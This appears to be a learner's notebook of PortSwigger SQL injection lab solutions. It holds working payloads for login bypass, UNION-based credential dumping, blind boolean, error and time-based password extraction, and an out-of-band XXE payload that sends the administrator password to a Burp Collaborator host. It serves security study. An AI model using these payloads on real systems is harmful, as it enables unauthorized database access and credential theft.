## Links:
1. https://portswigger.net/web-security/sql-injection 
2. https://portswigger.net/web-security/sql-injection/cheat-sheet

 [How to Bypass SQL Injection Filter](https://www.hackingarticles.in/bypass-filter-sql-injection-manually/)
 [Form Based SQL Injection](https://www.hackingarticles.in/form-based-sql-injection-manually/)

https://book.hacktricks.xyz/pentesting-web/sql-injection
https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap

## **1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**
SQL injection attack that causes the application to display one or more unreleased products.

	SELECT * FROM products WHERE category = ' OR 1=1--

```
	.../filter?category= ' OR 1=1--
```


## **2. SQL injection vulnerability allowing login bypass**
SQL injection attack that logs in to the application as the `administrator` user.

```
.../my-account?id=administrator'--
```


## **3. SQL injection querying the database type and version on Oracle**
 ```
 'UNION SELECT'a','b' FROM dual--
```

 Display the database version:
```
 'UNION SELECT 'a', banner FROM v$version--
```


## **4. SQL injection attack, querying the database type and version on MySQL and Microsoft**
In Microsoft database we can payload without to specify FROM table, instead we can comment with "#" right after selected columns:
 ```
 'UNION SELECT'a','b'#
```

 Display the database version:
```
 'UNION SELECT 'a', @@version#
 ```


## **5. SQL injection attack, listing the database contents on non-Oracle databases**
```
' UNION SELECT 'abc','def'--
```

Retrieve the list of tables in the database and find the name of the table containing user credentials
```
' UNION SELECT table_name, null FROM information_schema.tables--
```

Replacing the table name to retrieve the details of the columns in the table:
```
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users_abcdef'--
```

Replacing the table and column names to retrieve the usernames and passwords for all users:
```
' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
```


## **6. SQL injection attack, listing the database contents on Oracle**
```
' UNION SELECT 'a', 'b' FROM all_tables--
```

```
' UNION SELECT 'a', table_name FROM all_tables--
```

```
' UNION SELECT 'a', column_name FROM all_tab_columns WHERE table_name='USERS_EIEFAP'--
```

```
' UNION SELECT USERNAME_LFECQG, PASSWORD_MSPEUR FROM USERS_EIEFAP--
```


## **7. SQL injection UNION attack, finding a column containing text**
```
' UNION SELECT 'qHuBUo',null,null FROM information_schema.tables--
```

```
' UNION SELECT null,'qHuBUo',null FROM information_schema.tables--
```

```
' UNION SELECT null,null,'qHuBUo' FROM information_schema.tables--
```


## **8. SQL injection UNION attack, retrieving data from other tables**
```
' UNION SELECT null,null--
```

```
' UNION SELECT null, table_name FROM information_schema.tables--
```

```
' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--
```

```
' UNION SELECT username, password FROM users--
```


## **9. SQL injection UNION attack, retrieving multiple values in a single column**
```
' UNION SELECT 'a',null--   ERROR 500 (first position is not string based)
```

```
' UNION SELECT null,'a'--   ERROR 200 (so only the second one is)
```

In order to retrieve data we need to do that only on the second position using a concatenation method:
		![[Pasted image 20240627154432.png]]
```
(...)

' UNION SELECT null, username|| '-' ||password FROM users--
```

			![[Pasted image 20240627154411.png]]
			


## **10. Blind SQL injection with conditional responses(MYSQL)**
We will perform injection based on the session cookie (response = welcome back message)
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh
```

Blind testing using boolean conditioning
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND 1=1--
```

```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND 1=0--
```

Blind testing for users table
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT 'a' FROM users LIMIT 1)='a'--
```

Testing for username row value = administrator
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT 'a' FROM users WHERE username='administrator' LIMIT 1)='a'--
```

Checking the char. length of the password
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1 )='a'--
```

Using a Sniper Payload for efficiency&speed (found that password length = 20)
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§ )='a'--
```

Checking if first character of the password = 'a' using SUBSTRING(field, position, length)
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

Using Cluster Bomb payload for efficiency&speed for all the positions (1-20)(a-z)
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--
```


## **11. Blind SQL injection with conditional errors(ORACLE)**
We will perform injection based on the session cookie (internal server error: positive response) 
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh
```

```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND 1=1--NO ERROR or Message
```

```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND 1=0--NO ERROR or Message
```

So we will use a different conditional approach:

If (1=0) --> FALSE so will result no error because of ELSE 'a' (we will loose track of injection)
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
```

If (1=1) --> TRUE  so will result error because of TO_CHAR(1/0) (we will build our logic on this)
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
```


If LENGTH(password)>1 --> error which means that we are on the track  
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
```

Using a Sniper Payload for efficiency&speed (found that password length = 20)
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN (password)>§1§ THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
```

If SUBSTR(password,1,1) = 'a' --> error which means that we are on the track
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN SUBSTR(password,1,1) = 'a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'-- 
```

Using Cluster Bomb payload for efficiency&speed for all the positions (1-20)(a-z)
```
Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN SUBSTR(password,§1§,1) = '§a§' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'-- 
```


## **12.  Visible error-based SQL injection**
```
TrackingId=ogAZZfxtOKUELbuJ'
```
In the response, we notice a verbose error message. This discloses the full SQL query, including the value of your cookie. It also explains that you have an unclosed string literal. We also observe that our injection appears inside a single-quoted string.

We add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error.
```
TrackingId=ogAZZfxtOKUELbuJ'--
```
We longer receive an error (this suggests that the query is now syntactically valid).

We will adapt the query to include a generic `SELECT` subquery and cast the returned value to an `int` data type.
```
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```
Now we get a different error saying that an `AND` condition must be a boolean expression.

```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```
We send the request and confirm that we no longer receive an error. This suggests that this is a valid query again.

```
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```
We receive the initial error message again. The query now appears to be truncated due to a character limit. As a result, the comment characters we added to fix up the query aren't included.

Deleting the original value of the `TrackingId` cookie to free up some additional characters. 
```
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
```

```
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

 The error message now leaks the first username from the `users` table which is *administrator*:
 ```
 ERROR: invalid input syntax for type integer: "administrator"
 ```

```
 TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 ```
 The error message now leaks the first password from the `users` table which is the actual password used for *administrator*:


## **13. Blind SQL injection with time delays**
![[Pasted image 20240629015925.png]]

Confirm that parameter is vulnerable to injection
```
TrackingId=ogAZZfxtOKUELbuJ' || (SELECT pg_sleep(10)) --
```


## **14. Blind SQL injection with time delays and information retrieval**
The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

Confirm that the parameter is vulnerable to injection
```
|| SELECT(pg_sleep(10))--
```

Confirm that the `users` table with `username`='administrator' exists
```
|| (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) else pg_sleep(-1) END FROM users)--
```

Password length
```
|| (SELECT CASE WHEN (usernmae='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) else pg_sleep(-1) END FROM users)--
```

```
|| (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>§1§) THEN pg_sleep(10) else pg_sleep(-1) END FROM users)--
```

Password enumeration
```
|| (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) else pg_sleep(-1) END FROM users)--
```

```
|| (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) else pg_sleep(-1) END FROM users)--
```

## **15. Blind SQL injection with out-of-band interaction**

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

- Vulnerable parameter: tracking cookie
- End goal: SQLi and cause a DNS lookup

![[Pasted image 20240918095729.png]]
- Payload to be inserted into Cookie: Tracking Id parameter (also it could be encoded in HTML format when inserted into burp):
`' | | SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
![[Pasted image 20240918095940.png]]
![[Pasted image 20240918100131.png]]


## **16. Blind SQL injection with out-of-band data exfiltration**

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.


Same as previous example but this time we will concatenate['| | (subquery) ' | |]subquery on our burp collaborator server which is a select statement that will extract `password` from `users` where `username` is administrator:
`' | | SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual --`

![[Pasted image 20240918102633.png]]

## **17**. **Lab: SQL injection with filter bypass via XML encoding**

This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

![[Pasted image 20240918100813.png]]
![[Pasted image 20240918100905.png]]

![[Pasted image 20240918100602.png]]
![[Pasted image 20240918100938.png]]

- Payload to insert into burp hex encoded:
  `1 UNION SELECT username | |  '~'   | | password FROM users`
  ![[Pasted image 20240918101148.png]]
  